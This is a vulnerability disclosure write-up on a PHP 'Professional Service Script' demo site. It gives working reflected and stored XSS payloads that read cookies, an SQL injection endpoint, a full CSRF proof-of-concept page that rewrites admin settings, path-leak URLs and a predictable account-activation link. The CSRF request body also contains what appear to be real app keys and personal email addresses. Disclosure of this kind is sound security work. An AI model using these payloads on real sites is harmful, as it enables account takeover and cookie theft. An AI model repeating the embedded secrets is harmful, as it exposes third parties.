### Professional Service Script- the lastest version - SQL Injection/Stored-XSS/Reflect-XSS/Arbitrary-Binding/CSRF/Sensitive-Data-Leak[2]


#### ADLab of Venustech


Well,  when I pentest the official demo site of Readymade Video Sharing Script, I found some vulnerabilities here.


#### XSS:

##### Reflect-XSS

```
http://ordermanagementscript.com/demo/professional-service/admin/bannerview.php?view=27%27%22%3E666%3Cimg%20src=x%20onerror=console.log(document.cookie)%3E666%3C%27%22
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Professional-Service-Script/xss2.png)


##### Stored-XSS


```
http://ordermanagementscript.com/demo/professional-service/admin/general_settingupd.php
```

POST parameters:

```
------WebKitFormBoundary2ZjWQDBIsgNhKq3e
Content-Disposition: form-data; name="website_title"

Professional Service'"><svg/onload=alert(123)><'"
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Professional-Service-Script/xss1.png)


#### SQL Injection:

##### sqli1
```
http://ordermanagementscript.com/demo/professional-service/admin/review.php?id=70
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Professional-Service-Script/sqli.png)



#### CSRF

We can use csrf attack to cheat the user to change sensitive settings in the user panel, even add stored-xss content into it.

poc:

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http:\/\/ordermanagementscript.com\/demo\/professional-service\/admin\/general_settingupd.php", true);
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=----WebKitFormBoundary2ZjWQDBIsgNhKq3e");
        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.9");
        xhr.withCredentials = true;
        var body = "------WebKitFormBoundary2ZjWQDBIsgNhKq3e\r\n" + 
          "Content-Disposition: form-data; name=\"website_title\"\r\n" + 
          "\r\n" + 
          "Professional Service\'\"\x3e\x3csvg/onload=alert(document.cookie)\x3e\x3c\'\"\r\n" + 
          "------WebKitFormBoundary2ZjWQDBIsgNhKq3e\r\n" + 
          "Content-Disposition: form-data; name=\"website_keyword\"\r\n" + 
          "\r\n" + 
          "\x3cp\x3eProfessional Service\x3c/p\x3e\r\n" + 
          "------WebKitFormBoundary2ZjWQDBIsgNhKq3e\r\n" + 
          "Content-Disposition: form-data; name=\"website_url\"\r\n" + 
          "\r\n" + 
          "http://ordermanagementscript.com/demo/professional-service\r\n" + 
          "------WebKitFormBoundary2ZjWQDBIsgNhKq3e\r\n" + 
          "Content-Disposition: form-data; name=\"commonword\"\r\n" + 
          "\r\n" + 
          "Professional\r\n" + 
          "------WebKitFormBoundary2ZjWQDBIsgNhKq3e\r\n" + 
          "Content-Disposition: form-data; name=\"admin_add\"\r\n" + 
          "\r\n" + 
          "\x3cp\x3eCompanyName,\x3c/p\x3e\r\n" + 
          "\x3cp\x3ecompany address,\x3c/p\x3e\r\n" + 
          "\x3cp\x3eLocation.\x3c/p\x3e\r\n" + 
          "------WebKitFormBoundary2ZjWQDBIsgNhKq3e\r\n" + 
          "Content-Disposition: form-data; name=\"admin_email\"\r\n" + 
          "\r\n" + 
          "vsjayan@gmail.com\r\n" + 
          "------WebKitFormBoundary2ZjWQDBIsgNhKq3e\r\n" + 
          "Content-Disposition: form-data; name=\"paypal_email\"\r\n" + 
          "\r\n" + 
          "inet.prabhu1716@gmail.com\r\n" + 
          "------WebKitFormBoundary2ZjWQDBIsgNhKq3e\r\n" + 
          "Content-Disposition: form-data; name=\"currency\"\r\n" + 
          "\r\n" + 
          "USD\r\n" + 
          "------WebKitFormBoundary2ZjWQDBIsgNhKq3e\r\n" + 
          "Content-Disposition: form-data; name=\"fb_url\"\r\n" + 
          "\r\n" + 
          "https://www.facebook.com/\r\n" + 
          "------WebKitFormBoundary2ZjWQDBIsgNhKq3e\r\n" + 
          "Content-Disposition: form-data; name=\"tw_url\"\r\n" + 
          "\r\n" + 
          "https://twitter.com/\r\n" + 
          "------WebKitFormBoundary2ZjWQDBIsgNhKq3e\r\n" + 
          "Content-Disposition: form-data; name=\"linkedinurl\"\r\n" + 
          "\r\n" + 
          "https://in.linkedin.com/\r\n" + 
          "------WebKitFormBoundary2ZjWQDBIsgNhKq3e\r\n" + 
          "Content-Disposition: form-data; name=\"gplusurl\"\r\n" + 
          "\r\n" + 
          "https://plus.google.com/explore\r\n" + 
          "------WebKitFormBoundary2ZjWQDBIsgNhKq3e\r\n" + 
          "Content-Disposition: form-data; name=\"Img\"; filename=\"\"\r\n" + 
          "Content-Type: application/octet-stream\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "------WebKitFormBoundary2ZjWQDBIsgNhKq3e\r\n" + 
          "Content-Disposition: form-data; name=\"banner_img\"; filename=\"\"\r\n" + 
          "Content-Type: application/octet-stream\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "------WebKitFormBoundary2ZjWQDBIsgNhKq3e\r\n" + 
          "Content-Disposition: form-data; name=\"fbappid\"\r\n" + 
          "\r\n" + 
          "320789545076739\r\n" + 
          "------WebKitFormBoundary2ZjWQDBIsgNhKq3e\r\n" + 
          "Content-Disposition: form-data; name=\"fbkey\"\r\n" + 
          "\r\n" + 
          "0e0e841f7583ea866e11839f599c0ffc\r\n" + 
          "------WebKitFormBoundary2ZjWQDBIsgNhKq3e\r\n" + 
          "Content-Disposition: form-data; name=\"fbreurl\"\r\n" + 
          "\r\n" + 
          "http://ordermanagementscript.com/demo/professional-service/fblog_new/\r\n" + 
          "------WebKitFormBoundary2ZjWQDBIsgNhKq3e\r\n" + 
          "Content-Disposition: form-data; name=\"gappid\"\r\n" + 
          "\r\n" + 
          "966064226677-t3jl59r6llcg54dou9lro2kak0pf5n4c.apps.googleusercontent.com\r\n" + 
          "------WebKitFormBoundary2ZjWQDBIsgNhKq3e\r\n" + 
          "Content-Disposition: form-data; name=\"gkey\"\r\n" + 
          "\r\n" + 
          "rSiRaC22JZqyv9xUWJjoXZjV\r\n" + 
          "------WebKitFormBoundary2ZjWQDBIsgNhKq3e\r\n" + 
          "Content-Disposition: form-data; name=\"greurl\"\r\n" + 
          "\r\n" + 
          "http://ordermanagementscript.com/demo/professional-service/google_plus/\r\n" + 
          "------WebKitFormBoundary2ZjWQDBIsgNhKq3e\r\n" + 
          "Content-Disposition: form-data; name=\"g_submit\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "------WebKitFormBoundary2ZjWQDBIsgNhKq3e--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>


```

This vulnerability does not need evil attacker to login into the user panel.

#### Sensitive-Data-Leak

For example, we can get sensitive info like absolute-path here.
##### Leak1

```
http://ordermanagementscript.com/demo/professional-service/admin/review_userwise.php?id=72%27S
```
![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Professional-Service-Script/info_leak1.png)
##### Leak2

```
http://ordermanagementscript.com/demo/professional-service/service-list/category/22/house-cleaning
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Professional-Service-Script/info_leak2.png)

#### Arbitrary-Binding

I found when we're register the account, we should verify the email to activate the account.

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Professional-Service-Script/arbitrary-binding1.png)

But the url which send to the email is predictable. For example, the url the system send to my email is:
```
http://ordermanagementscript.com/demo/professional-service/login/?uid=NTA=
```
After Base64 decode:
```
http://ordermanagementscript.com/demo/professional-service/login/?uid=50
```
![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Professional-Service-Script/arbitrary-binding2.png)

So it's easy to predict or enum the uid to activate our account, then we can bind the account to any email-account, even if it's not exist.

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Professional-Service-Script/arbitrary-binding3.png)

In a word, it's a arbitrary-Binding bug here.
